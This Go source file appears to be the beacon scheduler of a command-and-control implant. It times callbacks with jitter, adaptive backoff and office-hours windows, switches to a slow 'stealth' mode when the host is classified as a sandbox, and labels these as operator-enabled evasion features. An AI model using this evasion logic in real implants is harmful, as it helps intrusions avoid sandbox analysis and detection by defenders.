//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"math"
	"sync"
	"sync/atomic"
	"time"
)

// ScheduleMode controls beacon timing strategy
type ScheduleMode int

const (
	ScheduleDefault   ScheduleMode = 0
	ScheduleAdaptive  ScheduleMode = 1
	ScheduleOfficeHrs ScheduleMode = 2
	ScheduleTrigger   ScheduleMode = 3
	ScheduleStealth   ScheduleMode = 4
)

// BeaconScheduler provides JIT (Just-In-Time) beacon scheduling
type BeaconScheduler struct {
	mu sync.Mutex

	mode         ScheduleMode
	baseInterval int
	minInterval  int
	maxInterval  int
	jitter       int
	nextBeacon   time.Time
	scheduledAt  time.Time

	// Office-hours config
	officeStart     int // Hour (0-23)
	officeEnd       int // Hour (0-23)
	officeDays      [7]bool
	outsideInterval int // Beacon interval outside office hours

	// Trigger-based
	triggers  []BeaconTrigger
	triggered atomic.Bool

	// Adaptive state
	lastBeaconTime   time.Time
	beaconLatency    time.Duration
	beaconCount      int
	consecutiveFast  int
	consecutiveSlow  int
	pendingTasks     atomic.Bool
	tasksSinceBeacon int
}

// BeaconTrigger defines an event that triggers an immediate beacon
type BeaconTrigger struct {
	Name      string
	Condition func() bool
	OneShot   bool
	fired     bool
}

func NewBeaconScheduler() *BeaconScheduler {
	return &BeaconScheduler{
		mode:            ScheduleDefault,
		baseInterval:    Interval,
		minInterval:     5,
		maxInterval:     3600,
		jitter:          Jitter,
		officeStart:     8,
		officeEnd:       18,
		outsideInterval: 600,
		lastBeaconTime:  time.Now(),
	}
}

func (bs *BeaconScheduler) SetMode(mode ScheduleMode) {
	bs.mu.Lock()
	defer bs.mu.Unlock()
	bs.mode = mode
}

func (bs *BeaconScheduler) Mode() ScheduleMode {
	bs.mu.Lock()
	defer bs.mu.Unlock()
	return bs.mode
}

func (bs *BeaconScheduler) ConfigureOfficeHours(start, end int, days []time.Weekday) {
	bs.mu.Lock()
	defer bs.mu.Unlock()
	bs.officeStart = start
	bs.officeEnd = end
	for i := 0; i < 7; i++ {
		bs.officeDays[i] = false
	}
	for _, d := range days {
		bs.officeDays[int(d)] = true
	}
}

func (bs *BeaconScheduler) AddTrigger(name string, condition func() bool, oneShot bool) {
	bs.mu.Lock()
	defer bs.mu.Unlock()
	bs.triggers = append(bs.triggers, BeaconTrigger{
		Name:      name,
		Condition: condition,
		OneShot:   oneShot,
	})
}

func (bs *BeaconScheduler) MarkPendingTasks() {
	bs.pendingTasks.Store(true)
}

func (bs *BeaconScheduler) TriggerImmediate() {
	bs.triggered.Store(true)
}

func (bs *BeaconScheduler) ShouldBeaconNow() bool {
	if bs.triggered.Load() {
		bs.triggered.Store(false)
		return true
	}
	pendingMu.Lock()
	hasPending := len(pendingResults) > 0
	pendingMu.Unlock()
	if hasPending {
		return true
	}

	bs.mu.Lock()
	now := time.Now()
	should := now.After(bs.nextBeacon) || bs.nextBeacon.IsZero()
	bs.mu.Unlock()
	return should
}

// ComputeNext calculates the next beacon time based on current mode and state
func (bs *BeaconScheduler) ComputeNext() time.Duration {
	bs.mu.Lock()
	defer bs.mu.Unlock()

	now := time.Now()
	bs.beaconCount++

	// Determine effective interval
	interval := bs.computeAdaptiveInterval()

	// Apply jitter
	jitRatio := float64(bs.jitter) / 100.0
	jitterRange := time.Duration(float64(time.Duration(interval)*time.Second) * jitRatio)
	jitterOffset := time.Duration(rng.Int63n(int64(jitterRange)*2+1)) - jitterRange
	effective := time.Duration(interval)*time.Second + jitterOffset
	if effective < time.Second {
		effective = time.Second
	}

	// Apply office-hours constraint
	if bs.mode == ScheduleOfficeHrs {
		effective = bs.applyOfficeHours(effective, now)
	}

	bs.nextBeacon = now.Add(effective)
	bs.lastBeaconTime = now
	bs.tasksSinceBeacon = 0

	return effective
}

func (bs *BeaconScheduler) computeAdaptiveInterval() int {
	p := getEnvDetector().Profile()
	envMin := p.MinBeaconInterval
	envMax := 300 // Cap adaptive growth

	// The env-detector floor only applies when the operator opted in to
	// evasion/ghost features. Default builds beacon at the configured interval.
	if !evasionEnabled && !ghostModeEnabled {
		envMin = 0
	}

	switch bs.mode {
	case ScheduleAdaptive:
		// Start fast, slow down if no tasks
		if bs.tasksSinceBeacon > 0 {
			bs.consecutiveFast++
			bs.consecutiveSlow = 0
			base := bs.baseInterval
			if base < envMin {
				base = envMin
			}
			return base
		}
		bs.consecutiveSlow++
		bs.consecutiveFast = 0
		// Exponential backoff: start at envMin, double each idle cycle
		backoff := float64(envMin) * math.Pow(1.5, float64(bs.consecutiveSlow))
		if backoff > float64(envMax) {
			backoff = float64(envMax)
		}
		return int(backoff)

	case ScheduleStealth:
		// Very slow, high jitter, random walk
		base := envMin*3 + bs.beaconCount%600
		if base < 300 {
			base = 300
		}
		if base > 3600 {
			base = 3600
		}
		return base

	case ScheduleTrigger:
		return envMin

	default:
		base := bs.baseInterval
		if base < envMin {
			base = envMin
		}
		return base
	}
}

func (bs *BeaconScheduler) applyOfficeHours(duration time.Duration, now time.Time) time.Duration {
	hour := now.Hour()
	weekday := now.Weekday()

	// Check if within office hours
	isOfficeDay := bs.officeDays[int(weekday)]
	isOfficeHour := hour >= bs.officeStart && hour < bs.officeEnd

	if isOfficeDay && isOfficeHour {
		return duration
	}

	// Outside office hours: use outside interval
	outsideDur := time.Duration(bs.outsideInterval) * time.Second

	// If outside interval is shorter, still apply it
	if bs.outsideInterval > 0 {
		return outsideDur
	}

	return duration
}

func (bs *BeaconScheduler) CheckTriggers() {
	bs.mu.Lock()
	triggers := make([]BeaconTrigger, len(bs.triggers))
	copy(triggers, bs.triggers)
	bs.mu.Unlock()

	for i, t := range triggers {
		if t.fired && t.OneShot {
			continue
		}
		if t.Condition() {
			logDebugf("Beacon trigger '%s' fired", t.Name)
			bs.TriggerImmediate()
			bs.mu.Lock()
			bs.triggers[i].fired = true
			bs.mu.Unlock()
		}
	}
}

func (bs *BeaconScheduler) AfterBeacon() {
	_ = bs.ComputeNext()
}

// Global scheduler instance
var (
	beaconSched     *BeaconScheduler
	beaconSchedOnce sync.Once
)

func getBeaconScheduler() *BeaconScheduler {
	beaconSchedOnce.Do(func() {
		beaconSched = NewBeaconScheduler()

		// Configure based on environment. Env-driven slowdown (office-hours
		// windows, sandbox stealth cadence, adaptive backoff) is an evasion
		// behavior: only apply it when the operator opted in to evasion/ghost
		// features. Default builds keep their configured interval and stay
		// visible in beacon management.
		if evasionEnabled || ghostModeEnabled {
			p := getEnvDetector().Profile()
			if p.OfficeHoursOnly {
				beaconSched.SetMode(ScheduleOfficeHrs)
				beaconSched.ConfigureOfficeHours(8, 18, []time.Weekday{
					time.Monday, time.Tuesday, time.Wednesday, time.Thursday, time.Friday,
				})
			} else if p.ClassLabel == "sandbox" {
				beaconSched.SetMode(ScheduleStealth)
			} else {
				beaconSched.SetMode(ScheduleAdaptive)
			}
		}

		// Auto-trigger: user activity
		beaconSched.AddTrigger("user_active", func() bool {
			return detectUserActivity()
		}, false)

		// Auto-trigger: network change (one-shot per change)
		beaconSched.AddTrigger("network_change", func() bool {
			return detectNetworkChange()
		}, true)
	})
	return beaconSched
}
